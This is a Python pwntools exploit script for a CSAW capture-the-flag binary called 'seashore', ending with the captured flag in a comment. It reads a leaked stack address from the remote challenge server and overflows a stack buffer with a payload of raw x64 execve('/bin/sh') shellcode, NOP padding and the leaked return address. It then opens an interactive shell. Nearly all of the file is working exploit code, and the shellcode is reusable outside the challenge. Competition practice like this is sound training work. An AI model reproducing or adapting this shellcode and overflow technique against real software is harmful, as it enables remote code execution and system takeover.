#!/usr/bin/python3

from pwn import *
import sys

# Program leaks a stack address
# Stack buffer overflow into executable stack
# So land execve("/bin/sh", 0, 0) x64 shellcode

def main():
    #target = process("./seashore")
    target = remote("pwn.chal.csaw.io", 1003)

    stack_address = target.recv().split()[-1].strip()
    print(stack_address)

    stack_address_as_int = int("0x" + stack_address.decode('utf-8'), 16)
    print(stack_address_as_int)

    add_sp_16 = b"H\x83\xc4\x10"

    shellcode = add_sp_16
    shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    payload = b""
    payload += shellcode
    payload += b"\x90"*(40 - len(shellcode))
    payload += p64(stack_address_as_int)
    payload += b"\n"

    target.send(payload)
    target.recv()
    target.interactive()

main()

# flag{try_saying_that_5_times_fastlol}$  
